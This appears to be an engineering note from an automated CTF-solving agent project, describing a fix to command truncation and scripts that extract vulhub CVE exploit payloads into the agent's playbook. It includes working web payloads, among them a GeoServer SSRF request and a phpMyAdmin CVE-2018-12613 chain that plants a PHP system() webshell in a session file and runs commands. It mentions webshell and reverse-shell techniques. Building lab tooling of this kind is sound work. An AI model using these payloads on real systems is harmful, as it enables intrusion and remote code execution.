# B 方案：把 vulhub 语料变成可执行载荷（2026-11-05）

用户决策：「补一下，然后接着做 B」。补 = 修采集端 300 字符截断；B = 公开 CVE 仓库。

---

## 一、先补的那个洞：采集端 300 字符截断

根因只有一行：

```python
# backend/muteki/solver/cli_driver.py:1137（改动前）
return StreamStep("tool", tool="shell", text=str(item.get("command", ""))[:300])
```

`text` 是唯一被持久化的副本，所以**每一条命令在进入事件流之前就被切到 300 字符**。
实测：22,819 条命令里最长 332 字符，8,790 条恰好 300 —— 所有多行载荷
（OGNL 表达式、gremlin 语句、heredoc 脚本）都是残缺的。

### 修法：沿用文件内已有的 `text`/`raw` 分工

`StreamStep` 早就为 `tool_result` 做过分层：`text` 给实时展示、`raw` 给判定门。
对 `kind == "tool"` 如法炮制，新增 `command` 字段：

| 字段 | 用途 | 长度 |
|---|---|---|
| `text` | 实时 deck 展示 | 300（不变） |
| `command` | 落库、可重放 | 完整 |

改了 3 个 driver（Codex / Claude / Cursor）＋ 采集器 `official_worker._on_step`。

### 顺带把上限从 900 提到 4000

`COMMAND_LIMIT=900` 也是错的，而且**讽刺**地从未真正生效过——上游 300 先切完了。
`payload_json` 是 MySQL `json` 类型（无 64KB 行上限），当前最长事件 7.7KB，4000 留足余量。

### 验证

`backend/tests/test_worker_command_fidelity.py`，7 条，其中最关键的一条：

```python
def test_recorder_prefers_the_full_command_over_the_preview():
    """A complete parser is worthless if the collector still reads ``text``."""
```

只改 driver 不改采集器，等于没改。

**历史数据无法回溯。** 修复只对新 Run 生效。提取器现在会显式报告：

```
跳过：...；**采集端截断 29 条**
注：这 29 条是 2026-11-05 修复采集截断之前记录的轨迹，命令在 300 字符处被切断，无法重放。
```

---

## 二、B 的核心发现：基础设施早就存在，缺的是内容深度

`data/knowledge/vulhub.jsonl` 已经存在、已经被 `EXTRA_PLAYBOOKS` 接入。
问题不是「没有 B」，而是**已有的 151 条几乎没有载荷**：

| 指标 | 值 |
|---|---|
| 条目数 | 151 |
| `payload_template` 长度中位 | **30 字符** |
| 只有一行（无请求体/头）的条目 | **121 / 151** |
| 真正可发送的载荷 | **32 / 151** |

典型条目：

```
payload_template: "POST /geoserver/TestWfsPost"
steps: ["... Send `POST /geoserver/TestWfsPost` — full request in README under geoserver/CVE-2021-40822."]
```

Worker 拿到的是**目录卡片**，它还得自己去读 README —— 这正是
`docs/notes/2026-11/2026-11-05-failure-attribution.md` 里测到的失败模式：87 条命令、4 条 fact、
卡住时反复读同一个 README。

### 而 README 里就有真载荷

`geoserver/CVE-2021-40822/README.zh-cn.md` 的复现段落：

```
POST /geoserver/TestWfsPost HTTP/1.1
Host: internal
Content-Type: application/x-www-form-urlencoded
Content-Length: 96

form_hf_0=&url=http://interal/geoserver/../&body=testtest&username=admin&password=admin
```

**Worker 镜像里已经自带这份语料**（`/home/kali/pocs/vulhub`，152 个产品、246 个 CVE 目录），
不需要下载、不涉及爬取合规问题。

---

## 三、提取器的四轮迭代（每轮都是被数据推翻的）

`scripts/extract_vulhub_payloads.py`

| 版本 | 做法 | 结果 | 被什么推翻 |
|---|---|---|---|
| v1 | 只认 `## 漏洞复现` + fenced block | 310 条 | `{{target_url}}:port` 168 条、45 条 <60 字符 |
| v2 | 修参数化顺序、加长度闸 | 259 条 | 9 个 CVE 明明有 README 却 0 条 |
| v3 | 复现段落**包含子章节** | 292 条 | phpMyAdmin 那条仍是 0 |
| v4 | 补**行内代码**提取 | **304 条** | — |

### v3 的原因值得一提

ActiveMQ CVE-2016-3088 的结构是：

```
## 漏洞详情
### 写入 webshell
### 写入 crontab，自动化弹 shell
### 写入 jetty.xml 或 jar
```

标题是「详情」不是「复现」，载荷在**下一级子章节**里。原来的解析器遇到任何 heading
就结束段落，只拿到父级那两行散文。改成按**标题层级**判断边界后，一次补齐 9 个 CVE。

### v4 的三种行内形态

有些 README 完全不用代码块，载荷写在正文的行内代码里：

| 形态 | 实例 | 处理 |
|---|---|---|
| 完整 URL | `` `http://your-ip:8080/index.php?target=db_sql.php%253f/../../etc/passwd` `` | 合成 `GET ... HTTP/1.1` |
| 脚本调用 | `` `python3 poc.py http://your-ip:8080/` `` | 保留原样（脚本就在同目录） |
| 裸绕过路径 | `` `/xxx/..;/admin/` `` | 合成请求行（路径本身就是漏洞） |

第三种只有 16 字符，会被 60 字符闸门滤掉。**闸门必须有例外**：
脚本/路径形态的下限设为 30 字符，否则会把诚实的短载荷当成碎片丢弃。

---

## 四、合并：一个把测试跑挂的真实陷阱

`scripts/merge_vulhub_playbook.py`

### 第一版规则（错了）

> 同 id 保留「有可执行载荷」的一方。

单独看没问题，跑全量回归**挂 2 条**：

```
FAILED test_a_solved_box_carries_the_steps_that_worked_last_time
FAILED test_the_stop_loss_gate_fires_only_for_a_callback_recipe
```

### 根因：`MAX_ENTRIES = 2` 是个零和预算

`_pick_entries` 每道题只给 **2 个**条目名额。我新增的
`vulhub:weblogic:cve-2018-2628` 没有覆盖任何东西（旧 `vulhub.jsonl` 里根本没这条），
但它**挤掉了** `cve-playbook.jsonl` 里的
`cve-2018-2628-weblogic-t3-negative` —— 那是一条 `negative` 条目，写着
「这题的正解是两次 HTTP，不需要反连」。

它一掉，`exploit_stop_loss_gate` 返回空字符串，Worker 会被引向一个
在 docker NAT 后面根本不可行的 JRMP 反连链。

**合并规则必须考虑跨文件的槽位竞争，而不只是 id 冲突。**

### 修正后的规则

```
1. 同 id          → 保留精修语义，只在旧版没有可发载荷时借用新版载荷
2. 同 CVE 不同 id → 已被 cve-playbook 覆盖的 CVE，完全不新增
3. 其余           → 新增
```

判「精修」不能只看载荷可执行性，要看**语义**：
`known_failures` 里出现 ★ / 反连 / 回显 / 实测，或来源是 `cve-playbook`。

### 结果

| | 合并前 | 合并后 |
|---|---|---|
| 条目 | 151 | **228** |
| 可发送载荷 | 32 | **176**（5.5×） |

同 CVE 跳过 121 条 —— 这 121 条不是浪费，是**避免了一次静默的能力退化**。

`backend/tests/test_vulhub_merge.py` 10 条，其中
`test_same_cve_under_a_different_id_does_not_take_the_slot` 就是钉这个回归的。

---

## 五、效果：91 道 CVE 题的真实覆盖

`scripts/measure_vulhub_coverage.py`，用真实题目调 `known_exploit_block`：

| | 有配方 | 含可发请求 | 完全没覆盖 |
|---|---|---|---|
| 合并前 | 38 (42%) | — | — |
| **合并后** | **82 (90%)** | **76 (83%)** | 9 |

未覆盖的 9 道是**数据本身缺失**，不是提取失败：

| 题目 | 原因 |
|---|---|
| Tomcat CVE-2020-1938 (Ghostcat) | README 只给了外链工具，没有载荷 |
| Drupal CVE-2018-7602 / CVE-2019-6341 | dump 里没有对应目录 |
| GhostScript / Joomla / PIL / Samba / Shiro-11989 / Tomcat-9484 | 同上 |

这 9 道要么另找来源（Awesome-POC，镜像里也自带 881MB），要么承认缺口。

### 抽检一条真实检索结果

```
题目: [PHPMYADMIN]CVE-2018-12613
  ## Known exploit path (curated, for THIS CVE)
  1. Get a session: curl -s -c cj.txt "$B/index.php" -o idx.html ...
  2. Take the CSRF token out of idx.html: grep -o 'name="token" value="[^"]*"'
  3. Read the session id from the jar: sid=$(awk '/phpMyAdmin/{print $7}' cj.txt)
  4. Inject: POST /import.php with ... sql_query="SELECT '<?=system($_GET[c])?>'"
  5. Execute: GET /index.php?target=db_sql.php%253f/../../tmp/sess_<sid>&c=id
  6. Read the flag from the process environment first: ?c=echo $FLAG
```

命中的是 `cve-playbook.jsonl` 的精修版（6 步），不是我的机械版 ——
**这正是合并规则该有的行为**。

---

## 六、代码与验证

| 文件 | 作用 |
|---|---|
| `scripts/extract_vulhub_payloads.py` | 从 README 提取载荷（304 条） |
| `scripts/merge_vulhub_playbook.py` | 合并进 live playbook（含槽位保护） |
| `scripts/measure_vulhub_coverage.py` | 用真实题目测覆盖率 |
| `backend/tests/test_worker_command_fidelity.py` | 7 条，防采集截断回归 |
| `backend/tests/test_vulhub_merge.py` | 10 条，防槽位挤占 |
| `data/knowledge/vulhub.jsonl` | 228 条（原 151） |
| `data/knowledge/candidates/vulhub-payloads.jsonl` | 304 条提取结果（可重跑） |

全量回归 **2245 passed**（基线 2214 → 2228 → 2235 → 2245）。

---

## 七、还没解决的

1. **9 道 CVE 题没有载荷**，vulhub 语料里确实没有。下一步可提取 Awesome-POC（881MB，镜像自带）。
2. **全部 304 条 `trust_level=unverified`**，一条都没在真实靶机上验证过。
   按 `KnowledgeItem.verified_solve` 的设计，它们能作为阅读材料进 `AGENTS.md`，
   **但不能发出 FIRST ACTION**。要让它们真正起作用，需要跑题验证 —— 这又回到
   「一臂 74 个 Run」的成本问题。
3. **采集截断的修复只对新 Run 生效**，历史轨迹仍是残的。
4. `.probe/vulhub-dump/`（3.5MB）是中间产物，可删；重跑提取器需要重新导出。
